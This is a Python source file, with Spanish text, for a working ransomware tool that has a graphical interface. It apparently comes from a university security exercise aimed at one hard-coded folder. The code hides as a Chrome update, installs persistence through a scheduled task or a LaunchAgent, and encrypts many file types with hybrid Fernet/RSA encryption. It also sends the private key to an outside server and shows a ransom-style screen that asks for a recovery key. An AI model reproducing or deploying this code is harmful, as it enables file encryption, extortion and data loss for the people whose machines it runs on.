import os
import sys
import subprocess
import platform
import json
import shutil
import socket
import threading
import time
import flet as ft
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
import requests 

# ==========================================
# CONFIGURACIÓN DEL API (HOSTINGER)
# ==========================================
API_URL = "https://seguridadinformatica.mausalinas.com/api.php" 

# ==========================================
# RUTA DONDE SE GUARDARÁ LA LLAVE SIMÉTRICA (CIFRADA)
# ==========================================
KEY_FILE_PATH = os.path.expanduser("~/.system_universidad_encrypted.key")

CONFIG = {
    "target_extensions": [
        ".txt", ".md", ".pdf", ".rtf", ".csv", ".tsv",
        ".xlsx", ".xls", ".pptx", ".ppt", ".numbers", ".pages", ".csv",
        ".js", ".py", ".c", ".cpp", ".h", ".hpp", ".java", ".php",
        ".html", ".css", ".scss", ".ts", ".jsx", ".tsx",
        ".json", ".xml", ".yaml", ".yml", ".ini", ".env", ".toml",
        ".sql", ".sqlite", ".db",
        ".png", ".jpg", ".jpeg", ".svg", ".ico", ".ttf", ".woff", ".woff2",
        ".ipynb", ".sav", ".mat", ".npy", ".npz", ".pkl", ".pka"
    ],
    "exclude_folders": [
        ".git", ".svn", ".hg", "node_modules", "vendor", ".venv", "venv", "env", ".env",
        ".cache", ".vscode", ".idea", ".DS_Store", "__pycache__", "coverage", ".next", 
        ".serverless", ".pytest_cache", ".jupyter", "build", "dist", "out", "bin", 
        "obj", "target", "lib", "android/build", "ios/build"
    ]
}

def is_vm():
    system = platform.system()
    vm_markers = ["virtualbox", "vmware", "kvm", "qemu", "hyper-v", "parallels", "xen"]
    if system == "Linux":
        try:
            with open("/proc/cpuinfo", "r") as f:
                content = f.read().lower()
                for marker in vm_markers:
                    if marker in content: return True
        except: pass
    elif system == "Darwin":
        try:
            model = subprocess.check_output(["sysctl", "-n", "hw.model"]).decode().lower()
            if any(marker in model for marker in vm_markers): return True
        except: pass
    elif system == "Windows":
        try:
            model = subprocess.check_output("wmic computersystem get model", shell=True).decode().lower()
            if any(marker in model for marker in vm_markers): return True
        except: pass
    return False

def detect_project_info():
    info = {"framework": "unknown", "package_manager": "unknown"}
    lockfiles = {"package-lock.json": "npm", "yarn.lock": "yarn", "pnpm-lock.yaml": "pnpm", "bun.lockb": "bun"}
    for lockfile, manager in lockfiles.items():
        if os.path.exists(lockfile):
            info["package_manager"] = manager
            break
    if os.path.exists("package.json"):
        try:
            with open("package.json", "r") as f:
                data = json.load(f)
                deps = {**data.get("dependencies", {}), **data.get("devDependencies", {})}
                if "expo" in deps: info["framework"] = "Expo"
                elif "react-native" in deps: info["framework"] = "React Native"
                elif "next" in deps: info["framework"] = "Next.js"
                elif "flutter" in deps: info["framework"] = "Flutter"
        except: pass
    return info

def establish_persistence():
    system = platform.system()
    script_path = os.path.abspath(sys.argv[0])
    if system == "Windows":
        target_dir = os.path.join(os.environ.get("LOCALAPPDATA", "C:\\"), "Google", "Chrome", "Update")
        target_name = "google_update.py"
    elif system == "Darwin":
        target_dir = os.path.expanduser("~/Library/Google/GoogleSoftwareUpdate")
        target_name = "ksupdate.py"
    else:
        target_dir = os.path.expanduser("~/.local/share/google/update")
        target_name = "update.py"

    target_path = os.path.join(target_dir, target_name)
    if not os.path.exists(target_dir):
        os.makedirs(target_dir, exist_ok=True)
    
    if script_path != os.path.abspath(target_path):
        try:
            shutil.copy2(script_path, target_path)
        except:
            return

    if system == "Windows":
        try:
            cmd = f'schtasks /create /tn "GoogleChromeUpdateTask" /tr "{sys.executable} {target_path}" /sc ONLOGON /f'
            subprocess.run(cmd, shell=True, check=True, capture_output=True)
        except: pass
    elif system == "Darwin":
        try:
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.google.chrome.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{target_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"""
            agent_path = os.path.expanduser("~/Library/LaunchAgents/com.google.chrome.update.plist")
            with open(agent_path, "w") as f:
                f.write(plist_content)
            subprocess.run(["launchctl", "load", agent_path], capture_output=True)
        except: pass
    return target_path

def discover_files(root_path="."):
    discovered = []
    exclude = set(CONFIG["exclude_folders"])
    targets = set(CONFIG["target_extensions"])
    for root, dirs, files in os.walk(root_path):
        dirs[:] = [d for d in dirs if d not in exclude]
        for file in files:
            _, ext = os.path.splitext(file)
            if ext.lower() in targets:
                discovered.append(os.path.join(root, file))
    return discovered

def check_environment():
    return {
        "virtual_env": os.getenv("VIRTUAL_ENV") or "None (Global)",
        "is_vm": is_vm(),
        "project": detect_project_info(),
        "os": platform.system()
    }

# ==========================================
# CRIPTOGRAFÍA HÍBRIDA
# ==========================================

def generate_rsa_keys():
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = private_key.public_key()
    
    pem_private = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )
    pem_public = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    return private_key, pem_private, public_key, pem_public

def encrypt_fernet_key(fernet_key, public_key):
    return public_key.encrypt(
        fernet_key,
        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
    )

def decrypt_fernet_key(encrypted_fernet_key, pem_private_bytes):
    private_key = serialization.load_pem_private_key(pem_private_bytes, password=None)
    return private_key.decrypt(
        encrypted_fernet_key,
        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
    )

def upload_keys_to_server(pem_public, pem_private):
    hostname = socket.gethostname()
    try:
        res = requests.post(
            API_URL, 
            json={"action": "upload", "hostname": hostname, "public_key": pem_public.decode('utf-8'), "private_key": pem_private.decode('utf-8')},
            timeout=10
        )
        if res.status_code == 200:
            data = res.json()
            if data.get("status") == "success":
                return data.get("password")
    except Exception as e:
        print("Error uploading:", e)
    return None

def download_private_key(password):
    try:
        res = requests.get(f"{API_URL}?action=get_key&password={password}", timeout=10)
        if res.status_code == 200:
            data = res.json()
            if data.get("status") == "success":
                return data.get("private_key").encode('utf-8')
    except Exception as e:
        print("Error downloading:", e)
    return None

def encrypt_file(file_path, key):
    try:
        f = Fernet(key)
        with open(file_path, "rb") as file_in:
            file_data = file_in.read()
        encrypted_data = f.encrypt(file_data)
        with open(file_path, "wb") as file_out:
            file_out.write(encrypted_data)
        os.rename(file_path, file_path + ".locked")
    except: pass

def decrypt_file(file_path, key):
    try:
        f = Fernet(key)
        with open(file_path, "rb") as file_in:
            encrypted_data = file_in.read()
        decrypted_data = f.decrypt(encrypted_data)
        original_path = file_path[:-7] 
        with open(original_path, "wb") as file_out:
            file_out.write(decrypted_data)
        os.remove(file_path)
    except: pass

def create_note(root_path):
    note_content = """TUS ARCHIVOS HAN SIDO ENCRIPTADOS POR SEGURIDAD.
No estás autorizado para utilizar esta carpeta y su contenido ha sido protegido.
Por favor comunícate con el Departamento de Informática."""
    try:
        with open(os.path.join(root_path, "INSTRUCCIONES_SEGURIDAD.txt"), "w") as f:
            f.write(note_content)
    except: pass

# ==========================================
# INTERFAZ GRÁFICA (FLET)
# ==========================================

def main_gui(page: ft.Page):
    target_folder = "/Volumes/ExtremeSSD/UniversidadObjetivo"
    
    if not os.path.exists(target_folder) or not os.path.isdir(target_folder):
        page.title = "Aviso de Seguridad"
        page.add(ft.Text(f"La carpeta objetivo estricta no se encontró:\n{target_folder}\n\nTerminando ejecución sin cambios.", color="red", size=20))
        page.update()
        return

    page.title = "Actualización del Sistema"
    try:
        page.window_width = 700
        page.window_height = 550
        page.window_resizable = False
    except: pass
        
    state = {"fernet_key_in_memory": None}

    def show_encrypt_view():
        page.clean()
        page.bgcolor = "#222222"
        page.vertical_alignment = "center"
        page.horizontal_alignment = "center"
        
        lbl_title = ft.Text("Actualizando base de datos...", size=24, weight="bold", color="white")
        progress = ft.ProgressBar(width=500, color="amber", bgcolor="#424242")
        lbl_status = ft.Text("Buscando archivos...", size=14, color="#bdbdbd")
        
        page.add(lbl_title, ft.Container(height=20), progress, ft.Container(height=10), lbl_status)
        page.update()
        return progress, lbl_status

    def show_rescue_view():
        page.clean()
        page.bgcolor = "#8b0000"
        page.vertical_alignment = "center"
        page.horizontal_alignment = "center"
        
        lbl_title = ft.Text("🔐 TUS ARCHIVOS HAN SIDO ENCRIPTADOS", size=24, weight="bold", color="white")
        info_text = ("Acceso no autorizado detectado.\n"
                     "Para recuperar tus documentos, entra en contacto con el administrador\n"
                     "e ingresa la clave de rescate asignada a este equipo.")
        lbl_info = ft.Text(info_text, size=14, color="#ffcccc", text_align="center")
        
        txt_pwd = ft.TextField(
            hint_text="Ingresa aquí la clave...", 
            width=300, 
            bgcolor="white", 
            color="black",
            border_color="transparent",
            text_align="center"
        )
        
        lbl_status = ft.Text("", size=14, color="white")
        
        def on_decrypt_click(e):
            pwd = txt_pwd.value.strip()
            if not pwd:
                lbl_status.value = "Por favor ingresa la clave asignada."
                lbl_status.color = "yellow"
                page.update()
                return
                
            btn_decrypt.disabled = True
            lbl_status.value = "[+] Verificando en base de datos..."
            lbl_status.color = "white"
            page.update()
            
            threading.Thread(target=run_decryption_process, args=(pwd, lbl_status, btn_decrypt), daemon=True).start()

        btn_decrypt = ft.ElevatedButton(
            "DESCIFRAR AHORA",
            color="#8b0000",
            bgcolor="white",
            on_click=on_decrypt_click,
            height=50,
            width=250
        )
        
        page.add(lbl_title, ft.Container(height=20), lbl_info, ft.Container(height=30), txt_pwd, ft.Container(height=10), btn_decrypt, ft.Container(height=10), lbl_status)
        page.update()

    def show_success_view():
        page.clean()
        page.bgcolor = "#2E8B57"
        page.vertical_alignment = "center"
        page.horizontal_alignment = "center"
        
        lbl_title = ft.Text("ACCESO RESTAURADO", size=28, weight="bold", color="white")
        lbl_info = ft.Text("Tus archivos han sido correctamente desencriptados.", size=16, color="white")
        
        def on_exit(e):
            try:
                page.window_destroy()
            except:
                sys.exit(0)
                
        btn_exit = ft.ElevatedButton("FINALIZAR", color="black", bgcolor="white", on_click=on_exit, height=50, width=200)
        page.add(lbl_title, ft.Container(height=10), lbl_info, ft.Container(height=40), btn_exit)
        page.update()

    def run_encryption_process():
        progress, lbl_status = show_encrypt_view()
        
        lbl_status.value = "Generando claves criptográficas híbridas..."
        page.update()
        private_key, pem_private, public_key, pem_public = generate_rsa_keys()
        
        state["fernet_key_in_memory"] = Fernet.generate_key()
        encrypted_fernet = encrypt_fernet_key(state["fernet_key_in_memory"], public_key)
        
        with open(KEY_FILE_PATH, "wb") as f:
            f.write(encrypted_fernet)
            
        if platform.system() == "Windows": os.system(f'attrib +h "{KEY_FILE_PATH}"')

        lbl_status.value = "Conectando con el servidor seguro..."
        page.update()
        pwd = upload_keys_to_server(pem_public, pem_private)
        
        files = discover_files(target_folder)
        total = len(files)
        
        for i, file_path in enumerate(files):
            if not file_path.endswith(".locked"):
                lbl_status.value = f"Procesando: {os.path.basename(file_path)}"
                progress.value = (i + 1) / total if total > 0 else 1.0
                page.update()
                encrypt_file(file_path, state["fernet_key_in_memory"])
                
        state["fernet_key_in_memory"] = None
        create_note(target_folder)
        
        time.sleep(1)
        show_rescue_view()

    def run_decryption_process(password, lbl_status, btn_decrypt):
        pem_private = download_private_key(password)
        if not pem_private:
            lbl_status.value = "[-] Error: Clave inválida o sin conexión a internet."
            lbl_status.color = "yellow"
            btn_decrypt.disabled = False
            page.update()
            return
            
        if not os.path.exists(KEY_FILE_PATH):
            lbl_status.value = "[-] Error crítico: Falta la llave nativa oculta en la máquina."
            lbl_status.color = "yellow"
            btn_decrypt.disabled = False
            page.update()
            return
            
        with open(KEY_FILE_PATH, "rb") as f:
            enc_fernet = f.read()
            
        try:
            state["fernet_key_in_memory"] = decrypt_fernet_key(enc_fernet, pem_private)
        except Exception:
            lbl_status.value = "[-] Error: La llave no pertenece a este equipo."
            lbl_status.color = "yellow"
            btn_decrypt.disabled = False
            page.update()
            return
            
        files = []
        for root_dir, _, fs in os.walk(target_folder):
            for file in fs:
                if file.endswith(".locked"):
                    files.append(os.path.join(root_dir, file))
                    
        for file_path in files:
            lbl_status.value = f"Desencriptando: {os.path.basename(file_path)}"
            page.update()
            decrypt_file(file_path, state["fernet_key_in_memory"])
            
        if os.path.exists(KEY_FILE_PATH):
            os.remove(KEY_FILE_PATH)
            
        time.sleep(1)
        show_success_view()

    if os.path.exists(KEY_FILE_PATH):
        show_rescue_view()
    else:
        threading.Thread(target=run_encryption_process, daemon=True).start()

if __name__ == "__main__":
    env_data = check_environment()
    establish_persistence()
    # Arrancar la aplicación Flet
    ft.app(target=main_gui)
